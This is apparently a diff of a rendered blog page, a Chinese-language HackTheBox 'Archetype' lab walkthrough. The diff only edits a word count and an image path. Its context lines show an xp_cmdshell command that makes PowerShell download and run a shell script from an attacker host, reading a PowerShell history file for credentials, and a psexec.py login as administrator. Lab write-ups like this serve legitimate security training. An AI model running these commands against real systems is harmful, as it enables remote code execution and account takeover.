@@ -198,7 +198,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      352 字
+      351 字
     </span>
   
 
@@ -260,7 +260,7 @@
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">xp_cmdshell &quot;powershell &quot;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.3/shell.ps1\&quot;);&quot; <br></code></pre></td></tr></table></figure>
 
 <h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>检查最近通过powershell输入的命令<br><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
-<p>查看到有输入的指令<br>![](HackTheBox Starting Point Archetype .27/Pasted%20image%2020201203151558.png)</p>
+<p>查看到有输入的指令<br>![](HackTheBox Starting Point Archetype .27/image-20201203151558.png)</p>
 <p>backups这个磁盘是通过管理员凭证映射的。可以通过Impackets的<code>psexec.py</code>来获得管理员权限</p>
 <p><code>psexec.py administraotr@10.10.10.27</code></p>
 
